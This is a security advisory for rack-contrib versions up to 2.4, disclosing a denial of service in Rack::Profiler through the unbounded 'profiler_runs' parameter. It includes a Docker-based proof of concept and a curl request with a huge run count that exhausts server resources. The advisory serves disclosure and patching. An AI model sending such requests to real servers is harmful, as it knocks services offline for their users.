# Denial of Service due to the unconstrained value of the incoming "profiler\_runs" parameter

High

[mpalmer](/mpalmer)
published
GHSA-8c8q-2xw3-j869
May 24, 2024

## Package

bundler

rack-contrib
([RubyGems](/advisories?query=ecosystem%3Arubygems))

## Affected versions

<= 2.4

## Patched versions

2.5.0

## Description

### Summary

The next ruby code is vulnerable to denial of service due to the fact that the user controlled data `profiler_runs` was not contrained to any limitation. Which would lead to allocating resources on the server side with no limitation (CWE-770).

```
        runs = (request.params['profiler_runs'] || @times).to_i
        result = @profile.profile do
          runs.times { @app.call(env) }
        end
```

An exploit as such `curl --fail "http://127.0.0.1:9292/?profiler_runs=9999999999&profile=process_time"` may cause resource exhaution by a remotely controlled value.

### PoC

Herein the `config.ru` file:

```
require 'rack'
require 'rack/contrib'

use Rack::Profiler # if ENV['RACK_ENV'] == 'development'

# Define a Rack application
app = lambda do |env|
  # Your application logic goes here
  [200, {}, ["Hello World"]]
end

# Run the Rack application
run app
```

A Dockerfile:

```
# Use the official Ruby image as a base
FROM ruby:latest

# Set the working directory inside the container
WORKDIR /app

# Copy the custom config.ru file into the container
COPY config.ru .
COPY Gemfile .

# Install rack and the gems needed to run the app
RUN bundle install

# Expose the port that rackup will listen on
EXPOSE 9292

# Run rackup when the container starts
ENTRYPOINT ["rackup","--host","0.0.0.0","--port","9292"]

# Health check
HEALTHCHECK --interval=3s --timeout=10s --start-period=2s --retries=3 CMD curl --fail http://localhost:9292/ || exit 1

```

A Gemfile

```
source 'https://rubygems.org'

gem 'rack', '~> 2.0'
gem 'rack-contrib', '~> 2.4'
gem 'rackup'
gem 'ruby-prof'

```

A Docker compose

```
services:
  app:
    build:
      context: .
    ports:
      - "9292:9292"
```

To run the PoC

```
docker compose up --build
```

To exploit DoS:

```
curl  "http://127.0.0.1:9292/?profiler_runs=9999999999&profile=process_time"
```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
